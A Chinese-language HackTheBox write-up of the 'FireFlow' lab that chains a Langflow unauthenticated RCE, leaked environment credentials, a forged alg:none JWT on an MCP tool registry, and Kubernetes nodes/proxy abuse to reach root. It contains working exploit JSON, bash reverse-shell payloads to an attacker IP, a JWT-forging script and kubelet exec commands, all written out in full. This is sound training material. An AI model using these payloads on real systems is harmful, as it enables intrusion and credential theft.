---
title: HackTheBox04
published: 2026-10-13T10:00:00
description: FireFlow 靶场从子域枚举发现 Langflow 1.8.2，利用 CVE-2026-33017 未授权 RCE 获取 www-data，从环境变量泄露凭据 SSH 至 nightfall。随后利用 MCP 服务 JWT alg:none 伪造管理员 Token，注册恶意工具获得 Pod Shell。最终滥用 SA 的 nodes/proxy 权限，经 Kubelet WebSocket exec 进入 node-exporter 容器，读取宿主机 root flag。
tags:
  - 靶场
  - HackTheBox
category: 网络安全
draft: false
---

```
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp   open     ssl/http  nginx
|_http-title: Did not follow redirect to https://fireflow.htb/
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
9100/tcp  filtered jetdirect
30000/tcp filtered ndmps
30718/tcp filtered unknown
30951/tcp filtered unknown
31038/tcp filtered unknown
31337/tcp filtered Elite
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

打开之后是自动化平台->open agent会跳转，顺便给这个子域名也放到hosts解析

```
External APIs: pending auth 
Flow: 7d84d636 
Access: public playground

 Platform core: nominal 
 Flow engine 1.8.2 
 MCP Tool Registry: online 
 Telemetry: active 
 NFAI-1: limited operation 
 Ext. APIs: awaiting authorisation
```

- 证书SAN：`fireflow.htb`、`*.fireflow.htb`
	
- 443是 nginx，说明后面有反代，可能挂多个子域/应用
	
- 页面标题重定向到 `https://fireflow.htb/`
    
- 页面文字：`public playground`、`Flow: 7d84d636`、`Flow engine 1.8.2`、`MCP Tool Registry: online`、`External APIs: pending auth`
    
- filtered 端口：9100、30000、30718、30951、31038、31337
    
- 22是 OpenSSH Ubuntu

**思路：**

1. 通配符证书 = 一定有子域，子域往往比主站更暴露。
    
2. 443反代 = 用 Host 头可以访问不同后端。
    
3. 页面功能 = 攻击面：Open Agent、Playground、MCP、External APIs。
    
4. filtered端口 = 不是死的，它们只是不能从你这里直连，通常要 SSRF、K8s 代理、端口转发才能碰。

到现在还是不存在漏洞点，尝试挖掘其他子域，使用ffuf

```
ffuf -k -u https://fireflow.htb -H "Host: FUZZ.fireflow.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-fs 162 \
-o ffuf_fireflow.html -of html
```

未知的 Host 头统一重定向到主站，发现过滤掉302之后只剩下`flow.fireflow.htb`也就是上面已经发现的

按照这个展开，查看一下Langflow的版本号，这是Langflow提供的专门进行版本查询接口

```
https://flow.fireflow.htb/api/v1/version
```

返回：

```
{
  "version": "1.8.2",
  "main_version": "1.8.2",
  "package": "Langflow"
}
```

已知该版本存在CVE-2026-33017未授权 RCE，端点接受攻击者提供的 `data` 参数，其中可以在节点定义里注入任意 Python 代码，代码会被 `exec()` 直接执行，没有沙箱。flow id `7d84d636`，是利用漏洞的关键参数，该id在打开该页面的时候就已经是默认参数了

确认漏洞端点存在，发现返回内容提示没找到cookie：

```
curl -sk -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \
  -H "Content-Type: application/json" \
  -d '{}' -i
HTTP/1.1 400 Bad Request
Server: nginx
Date: Tue, 13 Oct 2026 03:16:55 GMT
Content-Type: application/json
Content-Length: 38
Connection: keep-alive
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;

{"detail":"No client_id cookie found"}    
```

携带cookie再进行发送请求，f12查看数据包中的值，在终端设置成变量

```
client_id='3322a21f-941e-4c6e-9be5-497ed4953856'
```

携带cookie发送请求：

```
curl -sk -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \
  -H "Content-Type: application/json" \
  -H "Cookie: client_id=$client_id" \
  -d '{}' -i
```

返回：

```
{"job_id":"b40f2ebb-f0be-4376-bba7-e32d4789244d"}  
```

在页面发送一次正常请求，查看数据包中的数据格式：

```json
{"files":[],"data":{"nodes":…………}
```

POC：

```json
{
  "data": {
    "nodes": [
      {
        "id": "Exploit-001",
        "type": "genericNode",
        "position": { "x": 0, "y": 0 },
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/<你的IP>/<你的端口> 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [
              {
                "types": ["Data"],
                "selected": "Data",
                "name": "o",
                "display_name": "O",
                "method": "r",
                "value": "__UNDEFINED__",
                "cache": true,
                "allows_loop": false,
                "tool_mode": false,
                "hidden": null,
                "required_inputs": null,
                "group_outputs": false
              }
            ],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }
    ],
    "edges": []
  },
  "inputs": null
}
```

开启监听以及发送请求：

```
nc -lvvp 4

curl -sk -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \
  -H "Content-Type: application/json" \
  -H "Cookie: client_id=$client_id" \
  -d @fireflowpoc.json
```

拿到`www-data`的shell，`env`查看环境变量：

```
// 重要信息同时已经查看到home下用户为nightfall
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

ssh连接

```
ssh nightfall@fireflow.htb
// 密码复制上面的
```

ls -la查看当前目录下的文件，发现`.mcp`其下还有config.json

```
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

```
nightfall@fireflow:~$ curl -v http://10.129.244.214:30080/api/v1/version
*   Trying 10.129.244.214:30080...
* Connected to 10.129.244.214 (10.129.244.214) port 30080
> GET /api/v1/version HTTP/1.1
> Host: 10.129.244.214:30080
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< date: Tue, 13 Oct 2026 04:15:51 GMT
< server: uvicorn
< content-length: 322
< content-type: application/json
< 
* Connection #0 to host 10.129.244.214 left intact
{
	"service":"MCP AI Tool Registry",
	"version":"0.1.0",
	"auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},
	"docs":"/docs",
	"endpoints":["POST /mcp                        [MCP JSON-RPC 2.0]","POST /api/v1/auth","GET  /api/v1/tools","POST /api/v1/tools           [admin]"]
}
```

关键信息显示：**服务端接受 `alg: none` 的 JWT**。这意味着你不需要知道 HS256 密钥，就能伪造一个“签名有效”的管理员 Token。

JWT 格式是`header.payload.signature`。  当`alg`为`none`时，签名部分为空，Token以 `.` 结尾。

```bash
token=$(python3 - <<'PY'
import base64, json, time

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64url(json.dumps({
    "sub": "langflow-bot",
    "role": "admin",
    "exp": int(time.time()) + 3600
}).encode())

print(f"{header}.{payload}.")
PY
)

echo "$token"
```

解释：

- `base64.urlsafe_b64encode`：JWT 要求 Base64URL 编码。
    
- `.rstrip(b'=')`：去掉 Base64 的 `=` 填充。
    
- `header`：`{"alg":"none","typ":"JWT"}`。
    
- `payload`：包含 `sub`、`role: admin` 和过期时间 `exp`。
    
- `print(f"{header}.{payload}.")`：末尾的点表示签名为空。
    
- 目的：生成一个不需要密钥、服务端会认为“签名正确”的 admin Token。

枚举openapi：

```
nightfall@fireflow:~$ curl -s http://10.129.244.214:30080/openapi.json | python3 -m json.tool | head -100
{
    "openapi": "3.1.0",
    "info": {
        "title": "MCP AI Tool Registry \u2014 Task Force Nightfall",
        "version": "0.1.0"
    },
    "paths": {
        "/api/v1/version": {
            "get": {
                "summary": "Version",
                "operationId": "version_api_v1_version_get",
                "responses": {
                    "200": {
                        "description": "Successful Response",
                        "content": {
                            "application/json": {
                                "schema": {
                                    "additionalProperties": true,
                                    "type": "object",
                                    "title": "Response Version Api V1 Version Get"
                                }
                            }
                        }
                    }
                }
            }
        },
        "/api/v1/auth": {
            "post": {
                "summary": "Authenticate",
                "operationId": "authenticate_api_v1_auth_post",
                "requestBody": {
                    "content": {
                        "application/json": {
                            "schema": {
                                "$ref": "#/components/schemas/AuthRequest"
                            }
                        }
                    },
                    "required": true
                },
                "responses": {
                    "200": {
                        "description": "Successful Response",
                        "content": {
                            "application/json": {
                                "schema": {
                                    "additionalProperties": {
                                        "type": "string"
                                    },
                                    "type": "object",
                                    "title": "Response Authenticate Api V1 Auth Post"
                                }
                            }
                        }
                    },
                    "422": {
                        "description": "Validation Error",
                        "content": {
                            "application/json": {
                                "schema": {
                                    "$ref": "#/components/schemas/HTTPValidationError"
                                }
                            }
                        }
                    }
                }
            }
        },
        "/api/v1/tools": {
            "get": {
                "summary": "List Tools",
                "operationId": "list_tools_api_v1_tools_get",
                "responses": {
                    "200": {
                        "description": "Successful Response",
                        "content": {
                            "application/json": {
                                "schema": {
                                    "items": {},
                                    "type": "array",
                                    "title": "Response List Tools Api V1 Tools Get"
                                }
                            }
                        }
                    }
                }
            },
            "post": {
                "summary": "Register Tool",
                "operationId": "register_tool_api_v1_tools_post",
                "requestBody": {
                    "content": {
                        "application/json": {
                            "schema": {
                                "$ref": "#/components/schemas/ToolRegisterRequest"
                            }
                        }
                    },
                    "required": true
```

解释：

- `openapi.json`：FastAPI 应用自动生成的 API 描述文件。
    
- `python3 -m json.tool`：格式化 JSON，方便阅读。
    
- `head -100`：只看前 100 行。

重点找：

- `/api/v1/tools`：工具注册
    
- `/mcp`：JSON-RPC 端点
    
- `/api/v1/login`：登录
    
- `/api/v1/register`：注册

仿照格式注册恶意工具，需要取 ToolRegisterRequest 的 schema：

```
curl -s http://10.129.244.214:30080/openapi.json | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(json.dumps(d['components']['schemas']['ToolRegisterRequest'], indent=2))
"
// 返回内容
{
  "properties": {
    "name": {
      "type": "string",
      "title": "Name"
    },
    "description": {
      "type": "string",
      "title": "Description"
    },
    "inputSchema": {
      "anyOf": [
        {
          "additionalProperties": true,
          "type": "object"
        },
        {
          "type": "null"
        }
      ],
      "title": "Inputschema"
    },
    "code": {
      "type": "string",
      "title": "Code"
    }
  },
  "type": "object",
  "required": [
    "name",
    "description",
    "code"
  ],
  "title": "ToolRegisterRequest"
}
```

写payload并进行注册：

```
cat > /tmp/exploit.json <<'EOF'
{
  "name": "exploit",
  "description": "evil",
  "code": "import os; os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.17.118/4444 0>&1'\")"
}
EOF

curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
  -H "Authorization: Bearer $token" \
  -H "Content-Type: application/json" \
  -d @/tmp/exploit.json
```

攻击机进行监听，在目标主机写触发工具的操作：

```
cat > /tmp/call.json <<'EOF'
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "exploit",
    "arguments": {}
  }
}
EOF

curl -s -X POST http://10.129.244.214:30080/mcp \
  -H "Authorization: Bearer $token" \
  -H "Content-Type: application/json" \
  -d @/tmp/call.json
```

拿到`mcp`的shell，查看环境变量

```
// 只看k8s信息
mcp@mcp-server-54464cb475-29ztf:/app$ env
env
KUBERNETES_SERVICE_PORT_HTTPS=443
……
KUBERNETES_SERVICE_PORT=443
……
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
……
KUBERNETES_PORT_443_TCP_PROTO=tcp
……
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
……
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
```

因为MCP服务器Pod大约每两分钟会崩溃导致shell中断，所以写一个脚本并运行：

```
cat > ~/shell.sh << 'EOF'
#!/bin/bash
# 1. 注册工具
curl -X POST http://10.129.244.214:30080/api/v1/tools \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
  -H "Content-Type: application/json" \
  -d '{
    "name": "exploitnotes",
    "description": "evil",
    "code": "import os; os.system(\"bash -c '\''bash -i >& /dev/tcp/<你的ip>/<端口> 0>&1'\''\")"
  }' > /dev/null 2>&1
# 2. 触发工具
curl -s http://10.129.244.214:30080/mcp \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 9,
    "method": "tools/call",
    "params": {"name": "exploitnotes", "arguments": {}}
  }' > /dev/null 2>&1
EOF

chmod +x ~/shell.sh

~/shell.sh
```

每次获得新的 MCP Pod shell 后，**务必重新获取 ServiceAccount Token**，因为 Pod 重启后 token 会发生变化：

```
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

## 从 MCP Pod 到 Root Flag（Kubernetes 提权）

### 1. 确认 SA 权限

在 MCP Pod 中查询 `mcp-sa` 的实际权限：

```
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}" \
  "https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" | python3 -m json.tool
```

关键返回：

```
{
  "verbs": ["get"],
  "apiGroups": [""],
  "resources": ["nodes/proxy"]
}
```

说明：`mcp-sa` 没有 `list nodes` / `list pods` 权限（会 403），但拥有 `get nodes/proxy`，这是提权的核心。

### 2. 获取节点名与 Pod 信息

由于不能 list nodes，先通过 API Server 代理访问 Kubelet 的 `/pods` 端点，探测节点名：

```
for n in fireflow fireflow-node node1 k8s-node worker1 master; do
  echo -n "$n: "
  curl -sk -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $TOKEN" \
    "https://10.43.0.1:443/api/v1/nodes/$n/proxy/pods"
done
```

返回 `fireflow: 200`，确认节点名为 `fireflow`。

列出该节点所有 Pod：

```
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://10.43.0.1:443/api/v1/nodes/fireflow/proxy/pods" \
  | python3 -m json.tool | head -120
```

找到目标 Pod：

- namespace：`monitoring`
    
- Pod 名：`prometheus-prometheus-node-exporter-nmntq`
    
- 容器名：`node-exporter`

同时确认节点 IP（Kubelet 直连地址）：

```
curl -sk -o /dev/null -w "%{http_code}\n" --connect-timeout 5 \
  -H "Authorization: Bearer $TOKEN" https://10.129.244.214:10250/pods
```

返回 `200`，节点 IP 为 `10.129.244.214`。

### 3. 使用 PoC 执行命令

在 Kali 上下载公开 PoC `zwindler/nodes-proxy-rce-poc`，通过 HTTP 传到 MCP Pod：

```
git clone https://github.com/zwindler/nodes-proxy-rce-poc.git
cd nodes-proxy-rce-poc
python3 -m http.server 8000
```

在 MCP Pod

```
curl http://10.10.17.118:8000/w1-exec.py -o /tmp/w1-exec.py
```

`w1-exec.py` 需要 Python `websockets` 库，MCP Pod 中已存在。

正确用法（注意：命令与参数必须分开，不能加引号）：

```
python3 /tmp/w1-exec.py 10.129.244.214 "$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  monitoring prometheus-prometheus-node-exporter-nmntq node-exporter id
```

返回 `uid=0(root) gid=0(root) groups=0(root)`，确认可执行命令。

### 4. 读取 Root Flag

node-exporter 容器将宿主机根文件系统挂载在 `/host/root`，因此宿主机 `/root/root.txt` 对应容器内路径为：

```
/host/root/root/root.txt
```

执行：

```
python3 /tmp/w1-exec.py 10.129.244.214 "$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  monitoring prometheus-prometheus-node-exporter-nmntq node-exporter cat /host/root/root/root.txt
```

若路径不确定，可用 `find` 自动定位：

```
python3 /tmp/w1-exec.py 10.129.244.214 "$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  monitoring prometheus-prometheus-node-exporter-nmntq node-exporter sh -c \
  "find /host/root -maxdepth 3 -name root.txt -exec cat {} \; 2>/dev/null"
```

成功读取 root flag。